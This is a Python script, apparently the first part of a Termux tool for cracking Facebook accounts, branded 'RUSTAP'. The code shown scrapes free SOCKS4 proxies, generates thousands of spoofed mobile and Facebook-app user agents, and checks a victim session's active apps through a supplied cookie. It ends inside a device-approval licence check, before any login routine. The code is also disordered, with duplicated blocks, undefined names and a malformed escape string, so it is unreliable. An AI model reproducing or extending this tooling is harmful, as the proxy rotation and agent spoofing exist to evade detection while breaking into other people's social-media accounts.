#-----------------[ IMPORT-MODULE ]-------------------#

def modules():

	print("\033[1;37m [\u001b[36m•\033[1;37m] CHECKING FOR UPDATES \033[1;37m")

	os.system('pkg update -y && pkg upgrade -y')

	os.system('clear')

	try: 

		import rich

	except ModuleNotFoundError:

		print("\033[1;37m [\u001b[36m•\033[1;37m] RICH IS BEING INSTALLED \033[1;37m")

		os.system('pip install rich --quiet')

		print("\033[1;37m [\u001b[36m>>\033[1;37m] RICH HAS BEEN INSTALLED \033[1;37m")

	except:exit()

	try:

		import bs4

	except ModuleNotFoundError:

		print("\033[1;37m [\u001b[36m•\033[1;37m] BS4 IS BEING INSTALLED \033[1;37m")

		os.system('pip install bs4 --quiet')

		print("\033[1;37m [\u001b[36m>>\033[1;37m] BS4 HAS BEEN INSTALLED \033[1;37m")

	except:exit()

	try:

		import requests

	except ModuleNotFoundError:

		print("\033[1;37m [\u001b[36m•\033[1;37m] REQUESTS IS BEING INSTALLED \033[1;37m")

		os.system('pip install requests --quiet')

		print("\033[1;37m [\u001b[36m>>\033[1;37m] REQUESTS HAS BEEN INSTALLED \033[1;37m")

	except:exit()

	exit()

try:

	import requests,bs4,json,os,sys,random,datetime,time,re,multiprocessing,socket

	from bs4 import BeautifulSoup as bs

	from bs4 import BeautifulSoup

	import urllib3,rich,base64

	from rich.table import Table as me

	from rich.console import Console as sol

	from bs4 import BeautifulSoup as sop

	from concurrent.futures import ThreadPoolExecutor as tred

	from rich.console import Group as gp

	from rich.panel import Panel as nel

	from rich import print as cetak

	from rich.markdown import Markdown as mark

	from rich.columns import Columns as col

	from rich import print as prints

	from rich import pretty

	from rich.text import Text as tekz

	from time import localtime as lt

	pretty.install()

	CON=sol()

except ModuleNotFoundError:

	modules()

#------------------[ GLOBAL VARIABLES ]-------------------#

version='1. 3'
file_name=[]
ugen2=[]
logincookie=[]
cekap=[]
askc=[]
scp= 'n'
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
ualuh=[]

#------------------[ PROXY ]-------------------#

try:

	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text

	open('.prox.txt','w').write(prox)

except Exception as e:

	pass

prox=open('.prox.txt','r').read().splitlines()

#------------------[ USER-AGENT ]-------------------#

ugen2=[]

ugen=[]

cokbrut=[]

ses=requests.Session()

princp=[]

try:

	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text

	open('.prox.txt','w').write(prox)

except Exception as e:

	pass

prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):

	a='Mozilla/5.0 (Symbian/3; Series60/'

	b=random.randrange(1, 9)

	c=random.randrange(1, 9)

	d='Nokia'

	e=random.randrange(100, 9999)

	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'

	g=random.randrange(1, 9)

	h=random.randrange(1, 4)

	i=random.randrange(1, 4)

	j=random.randrange(1, 4)

	k='Mobile Safari/535.1'

	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')

	ugen2.append(uaku)

	aa='Mozilla/5.0 (Linux; U; Android'

	b=random.choice(['6','7','8','9','10','11','12'])

	c=' en-us; GT-'

	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	e=random.randrange(1, 999)

	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

	h=random.randrange(73,100)

	i='0'

	j=random.randrange(4200,4900)

	k=random.randrange(40,150)

	l='Mobile Safari/537.36'

	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

	ugen.append(uaku2)

for x in range(10):

	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'

	b=random.randrange(100, 9999)

	c=random.randrange(100, 9999)

	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	h=random.randrange(1, 9)

	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'

	j=random.randrange(1, 9)

	k=random.randrange(1, 9)

	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'

	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

def uaku():

	try:

		ua=open('user-agents.txt','r').read().splitlines()

		for ub in ua:

			ugen.append(ub)

	except:

		a=requests.get('https://github.com/cvandeplas/pystemon/blob/master/user-agents.txt').text

		ua=open('user-agents.txt','w')

		aa=re.findall('line">(.*?)<',str(a))

		for un in aa:

			ua.write(un+'\n')

		ua=open('user-agents.txt','r').read().splitlines()

#------------[ INDICATION ]---------------#

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]

cokbrut=[]

pwpluss,pwnya=[],[]

#------------[ WARNA-COLOR ]--------------#

P = '\x1b[1;97m'

M = '\x1b[1;91m'

H = '\x1b[1;92m'

K = '\x1b[1;93m'

B = '\x1b[1;94m'

U = '\x1b[1;95m' 

O = '\x1b[1;96m'

N = '\x1b[0m'    

Z = "\033[1;30m"

sir = '\033[41m\x1b[1;97m'

x = '\33[m' # DEFAULT

m = '\x1b[1;91m' #RED +

k = '\033[93m' # KUNING +

h = '\x1b[1;92m' # HIJAU +

hh = '\033[32m' # HIJAU -

u = '\033[95m' # UNGU

kk = '\033[33m' # KUNING -

b = '\33[1;96m' # BIRU -

p = '\x1b[0;34m' # BIRU +

asu = random.choice([m,k,h,u,b])

###----------[ ANSII COLOR STYLE ]---------- ###

Z = "\x1b[0;90m"     # Hitam

M = "\x1b[38;5;196m" # Merah

H = "\x1b[38;5;46m"  # Hijau

K = "\x1b[38;5;226m" # Kuning

B = "\x1b[38;5;44m"  # Biru

U = "\x1b[0;95m"     # Ungu

O = "\x1b[0;96m"     # Biru Muda

P = "\x1b[38;5;231m" # Putih

J = "\x1b[38;5;208m" # Jingga

A = "\x1b[38;5;248m" # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###

Z2 = "[#000000]" # Hitam

M2 = "[#FF0000]" # Merah

H2 = "[#00FF00]" # Hijau

K2 = "[#FFFF00]" # Kuning

B2 = "[#00C8FF]" # Biru

U2 = "[#AF00FF]" # Ungu

N2 = "[#FF00FF]" # Pink

O2 = "[#00FFFF]" # Biru Muda

P2 = "[#FFFFFF]" # Putih

J2 = "[#FF8F00]" # Jingga

A2 = "[#AAAAAA]" # Abu-Abu

#------------------APK<>CHECKER-------------------#    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
      print(f'%s{P}[%s�%s] %sSorry there is no Active  Apk%s         '%(N,M,N,B,N))
    else:
        print(f'[] %s  Your Active Apps      :{B}'%(GREEN))
        for i in range(len(game)):
            print(f"[%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'%s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,B,N,M,N))
    else:
        print(f'[] %s  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"[%s%s] %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('\x1b[1;91m \x1b[1;92m\033[1;92m \033[1;93m\033[1;94m\033[1;95m\033[1;96m\033[1;95m\033[1;94m\033[1;96m\033[1;92m5\x1b[1;92m \x1b[1;91m  ')
       

#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

#------------[ Login-pag ]--------------#
j = 'x'
i = 'mbasic'
a = 'm'
b = 'g'
c = 'free'
e = 'web'
f = 'developer'



#------------[ WARNA-COLOR ]--------------#



#uge#=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3','Nokia N95: Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/21.0.016; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413','Nokia 5800: Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/50.0.005; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.1.18124','Nokia E71: Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE71-1/100.07.76; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413','Mozilla/5.0 (Linux; Android 13; V2169 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]','Mozilla/5.0 (Linux; Android 13; SM-M127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 11; itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 7.1.1; N9560 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]','Mozilla/5.0 (Linux; Android 12; 22041219C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 12; TECNO KH6 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/391.2.0.20.404;]','Mozilla/5.0 (Linux; Android 11; MP02 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 12; CPH2457 Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 11; T781SPP Build/RKQ1.210614.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 10; Z555 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/388.0.0.23.106;]','Mozilla/5.0 (Linux; Android 8.0.0; CUBOT_P20 Build/O00623; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/390.2.0.29.103;]','Mozilla/5.0 (Linux; Android 10; EVE-LX9N Build/HUAWEIEVE-LX9N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/370.0.0.14.108;]','Mozilla/5.0 (Linux; Android 12; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 11; Armor 12 5G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 12; 22041216C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 10; CDY-NX9B Build/HUAWEICDY-N29B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/391.0.0.0.302;]','Mozilla/5.0 (Linux; Android 10; STS570 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/389.1.0.23.214;]','Mozilla/5.0 (Linux; Android 11; TECNO KG6p Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;']
ugen4=['Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36']
ugen5=['Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/330.0.0.10.108;]','	Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/334.0.0.17.101;]','	Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]','	Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/334.0.0.17.101;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/321.0.0.13.113;]','	Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/337.0.0.7.102;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/336.0.0.11.99;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/337.0.0.7.102;]','Mozilla/5.0 (Linux; U; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 OPR/10.8.2254.63920','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/336.0.0.11.99;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/335.0.0.15.96;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/288.0.0.11.115;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/325.0.1.4.108;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/288.0.0.11.115;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/334.0.0.17.101;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/330.0.0.10.108;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/335.0.0.15.96;]']





RED = '\x1b[38;5;208m'
WHITE = '\033[1;92m'
GREEN = '\033[\033[1;92m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])

#--------------------[ CONVERTER-BULAN ]--------------#

dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}

dic2 = {'01':'JANUARY','02':'FEBRUARY','03':'MARCH','04':'APRIL','05':'MAY','06':'JUNE','07':'JULY','08':'AUGUST','09':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}

tgl = datetime.datetime.now().day

bln = dic[(str(datetime.datetime.now().month))]

thn = datetime.datetime.now().year

date = str(tgl)+'/'+str(bln)+'/'+str(thn)

ltx = int(lt()[3])

if ltx > 12:

    a = ltx-12

    tag = "PM"

else:

    a = ltx

    tag = "AM"

#------------------[ MACHINE-SUPPORT ]---------------#

def animation(u):

	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)

def anish_rustapp(u):

        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)

def clear():

	os.system('clear')

def back():

	login()

def contact():

	os.system('xdg-open https://www.facebook.com/badshahking21')

	back()

def linex():

	print('\033[1;37m----------------------------------------------')


#------------------[ LOGO-LAKNAT ]-----------------#
logo=("""    
\033[1;31m /$$$$$$$  /$$   /$$  /$$$$$$  /$$$$$$$$ /$$$$$$  /$$$$$$$ 
| $$__  $$| $$  | $$ /$$__  $$|__  $$__//$$__  $$| $$__  $$
\033[1;32m| $$  \ $$| $$  | $$| $$  \__/   | $$  | $$  \ $$| $$  \ $$
| $$$$$$$/| $$  | $$|  $$$$$$    | $$  | $$$$$$$$| $$$$$$$/
\033[1;33m| $$__  $$| $$  | $$ \____  $$   | $$  | $$__  $$| $$____/ 
| $$  \ $$| $$  | $$ /$$  \ $$   | $$  | $$  | $$| $$      
\033[1;33m| $$  | $$|  $$$$$$/|  $$$$$$/   | $$  | $$  | $$| $$      
|__/  |__/ \______/  \______/    |__/  |__/  |__/|__/      
                                                           
\033[1;37m     """)
def info():
	print(f"""\x1b[37m----------------------------------------------
 AUTHOR     : RUSTAP
 GITHUB     : DONT KNOW
 FACEBOOK   : RUSTAP CHAUDHARY
 VERSION    : \x1b[37m\x1b[38;5;196m{1.3}\x1b[37m
\x1b[37m----------------------------------------------""")
def banner():
	print(logo)
#banner()
#file()
#print(f'\033[1;92m[\033[1;31m\033[1;92m]\033[0;92m WHAT IS YOUR NAME')
#RUSTAP_NAME=input(f'\033[1;92m[\033[1;31m\033[1;92m]\033[0;92m YOUR NAME :\x1b[1;96m ')
#--------------------[ LOGIN APPRV]--------------#

#------------------[ GREETINGS ]-----------------#

current_time = datetime.datetime.now()
current_hour = current_time.hour
if 5 <= current_hour < 12:
    greeting = "GOOD MORNING   : "
elif 12 <= current_hour < 17:
    greeting = "GOOD AFTERNOON : "
elif 17 <= current_hour < 20:
    greeting = "GOOD EVENING   : "
else:
    greeting = "GOOD NIGHT     : "

#------------------[ NAME AND PSW ASK ]-------------------#

if not os.path.exists("data"):
    os.mkdir("data")
try:open("data/name.xml", "r")
except FileNotFoundError:
    open("data/name.xml", "w")
    pass
try:open("data/password.xml", "r")
except FileNotFoundError:
    open("data/password.xml", "w")
    pass
def namepsw():
    os.system('clear')
    banner()
    info()
    if os.path.exists("data/name.xml") and os.path.getsize("data/name.xml") > 0:
        with open("data/name.xml", "r") as name_file_obj:
            uname = name_file_obj.readline().strip()
    else:
        print(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR REAL NAME")
        linex()
        uname = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR NAME : ")
        linex()
        with open("data/name.xml", "w") as name_file_obj:
            name_file_obj.write(uname)
    if os.path.exists("data/password.xml") and os.path.getsize("data/password.xml") > 0:
        with open("data/password.xml", "r") as password_file_obj:
            upass = password_file_obj.readline().strip()
    else:
        print(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ADD A PSW TO YOUT ACCOUNT")
        linex()
        upass = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR PASSWORD : ")
        linex()
        with open("data/password.xml", "w") as password_file_obj:
            password_file_obj.write(upass)
    animation(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOUR DETAILS HAS BEEN CHANGED ")
    restart()
try:
    with open('data/name.xml', 'r') as name_file:
        uname = name_file.readline().strip()
    with open('data/password.xml', 'r') as password_file:
        upass = password_file.readline().strip()
    if len(uname) > 1 and len(upass) > 1:
        pass
    else:
        namepsw()
except FileNotFoundError:
    namepsw()
except IOError:
    namepsw()
    
def passask():
    with open('data/password.xml', 'r') as file:
        stored_password = file.read().strip()
    linex()
    user_password = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER THE PASSWORD : ")
    if user_password == stored_password:
        pass
    else:
        linex()
        animation(" \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m ACCESS DENIED !")
        restart()

#----------APPROVAL----------#
def remove_symbols_and_spaces(input_string):
    cleaned_string = re.sub(r'[^a-zA-Z0-9#]', '', input_string)
    return cleaned_string
import requests
def approval():
  os.system('clear')
  print(logo)
  import platform
  uuid = str(os.geteuid())+'#'+ platform.uname().machine+platform.uname().version+platform.uname().release
  id = remove_symbols_and_spaces(uuid)
